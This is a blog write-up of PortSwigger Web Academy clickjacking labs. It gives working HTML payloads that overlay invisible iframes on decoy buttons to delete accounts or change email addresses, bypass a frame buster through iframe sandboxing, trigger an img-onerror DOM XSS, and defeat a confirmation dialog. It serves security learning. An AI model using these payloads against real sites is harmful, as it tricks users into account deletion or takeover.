---
title: (Portswigger/WebAcademy) - Clickjacking
 vulnerabilities
author:
  name: eng4ge
  link: https://github.com/an9k0r
date: 2023-01-15 09:00:00 +0200
categories: [Web Application, Clickjacking vulnerabilities]
tags: [Notes, Clickjacking vulnerabilities, Portswigger]
math: true
mermaid: true
image:
  src: 
  width: 694
  height: 515
  alt: image alternative text
---
# Intro
This post/writeup is all about the Clickjacking Vulnerabilities.

I'll be using primarily [Portswigger Web Academy](https://portswigger.net/web-security/clickjacking) Labs, but i do intent do throw other labs and writeups here as well.

To learn more on the topic, please visit the article linked above at Portswigger's.
## TOC
- [Intro](#intro)
  - [TOC](#toc)
- [Basic clickjacking with CSRF token protection](#basic-clickjacking-with-csrf-token-protection)
- [Clickjacking with form input data prefilled from a URL parameter](#clickjacking-with-form-input-data-prefilled-from-a-url-parameter)
- [Clickjacking with a frame buster script](#clickjacking-with-a-frame-buster-script)
- [Exploiting clickjacking vulnerability to trigger DOM-based XSS](#exploiting-clickjacking-vulnerability-to-trigger-dom-based-xss)
- [Multistep clickjacking](#multistep-clickjacking)


# Basic clickjacking with CSRF token protection
> This lab contains login functionality and a delete account button that is protected by a CSRF token. A user will click on elements that display the word "click" on a decoy website.
> 
> To solve the lab, craft some HTML that frames the account page and fools the user into deleting their account. The lab is solved when the account is deleted.
You can log in to your own account using the following credentials: wiener:peter

First we have to login. TL:DR; The target website does not have any clickjacking protection.

This is the payload page that victim will open:
```html
<head>
	<style>
		#target_website {
			position:relative;
			width:700px;
			height:600px;
			opacity:0.00001;
			z-index:2;
			}
		#decoy_website {
			position:absolute;
			top:492px;
			left:70px;
			z-index:1;
			}
	</style>
</head>
<body>
	<div id="decoy_website">
	Click Me
	</div>
	<iframe id="target_website" src="https://0a3c00b7033112208526365100e5001e.web-security-academy.net/my-account">
	</iframe>
</body>
```

For the screenshot i have changed the `z-index` of the decoy so it get's visible and as seen below, it should be placed above the button `Delete Account`:

![picture 0](/assets/images/8f99087a7da010c77057b82c2102573581df0c584087c08ba1690b4f2c01f2f1.png)  

This is the page that victim would see:

![picture 1](/assets/images/4aba040945c310d4acd9d090300b35ae70610cd85b66c7677648c4e9626d2012.png)  

# Clickjacking with form input data prefilled from a URL parameter
> This lab extends the basic clickjacking example in Lab: Basic clickjacking with CSRF token protection. The goal of the lab is to change the email address of the user by prepopulating a form using a URL parameter and enticing the user to inadvertently click on an "Update email" button.
> 
> To solve the lab, craft some HTML that frames the account page and fools the user into updating their email address by clicking on a "Click me" decoy. The lab is solved when the email address is changed.
> 
> You can log in to your own account using the following credentials: wiener:peter

This lab is same as the last one, we just have to find a way to prepopulate a field in a form which will trigger a POST request with value that we (as attacker) have set.

As seen below, we can use `email` in a GET request to achieve that.

![picture 2](/assets/images/4977ca1854862e3d1cced270102755a2cc31a9f13b85b645bc051130a7314446.png)  

This is the code that worked for me:

```html
<style>
    iframe {
        position:relative;
        width:780px;
        height: 600px;
        opacity: 0.00001%;
        z-index: 2;
    }
    div {
        position:absolute;
        top:454px;
        left:70px;
        z-index: 1;
    }
</style>
<div>Click Me</div>
<iframe src="https://0aaa008d03d1128b85934f6f00950027.web-security-academy.net/my-account?email=test@attacker.de"></iframe>
```

# Clickjacking with a frame buster script
> This lab is protected by a frame buster which prevents the website from being framed. Can you get around the frame buster and conduct a clickjacking attack that changes the users email address?
> 
> To solve the lab, craft some HTML that frames the account page and fools the user into changing their email address by clicking on "Click me". The lab is solved when the email address is changed.
> 
> You can log in to your own account using the following credentials: wiener:peter

Same lab as before, we just need to bypass frame buster by sandboxing the iframe. 

```html
<style>
    iframe {
        position:relative;
        width:780px;
        height: 600px;
        opacity: 0.00001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:449px;
        left:70px;
        z-index: 1;
    }
</style>
<div>Click Me</div>
<iframe sandbox="allow-forms"
src="https://0a4e001804ae73c880ca031700cf00e7.web-security-academy.net/my-account?email=wiener@changed.de"></iframe>
```

# Exploiting clickjacking vulnerability to trigger DOM-based XSS
> This lab contains an XSS vulnerability that is triggered by a click. Construct a clickjacking attack that fools the user into clicking the "Click me" button to call the print() function.

First we need to find a DOM XSS. I have used DOM Invader for that purpose:

![picture 3](/assets/images/921cd528d337bb398d68ff7ce68c6c50e0bdc7e6333885358e1b4f9dbd20093c.png)  

Page has no clickjacking protection so we can prefill the values by using them in a GET request as seen below:

```
https://0a48002204bfa14b8080443700f100bc.web-security-academy.net/feedback?message=test&name=%3Cimg%20src%20onerror=print()%3E&email=a@a.de&subject=test
```

When submitting, `print()` should fire.

# Multistep clickjacking
> This lab has some account functionality that is protected by a CSRF token and also has a confirmation dialog to protect against Clickjacking. To solve this lab construct an attack that fools the user into clicking the delete account button and the confirmation dialog by clicking on "Click me first" and "Click me next" decoy actions
> 
> You will need to use two elements for this lab.
> 
> You can log in to the account yourself using the following credentials: wiener:peter

This lab is protected by additional page when wanting to delete the account.

After logging in:

![picture 4](/assets/images/d17e907aae59e573cfce0e7656e45a646c0b0254200ad4285dd0438974844d69.png)  

After clicking on `Delete account`:

![picture 5](/assets/images/bf4b5bf1de70e71654c18f04bb6b923a96e693b1d07ca9030919a4a001ddab32.png)  

Because of the SOP, there we are limited what to do. Basically we display both `CLick me` buttons at once and the right places, so first click and second click align with buttons in an iframe that lead to account deletion.

```html
<style>
    iframe {
        position:relative;
        width:780px;
        height: 600px;
        opacity: 0.00001;
        z-index: 2;
    }
    #div1, #div2 {
        position:absolute;
        top:492px;
        left:70px;
        z-index: 1;
    }
     #div2 {
    top: 292px;
    left: 207px;
}
     
</style>

<div id="div1">Click me first</div>
<div id="div2">Click me next</div>
<iframe id ="iframe" 
src="https://0a1e001a038a370a805fc16900b7002e.web-security-academy.net/my-account"></iframe>
```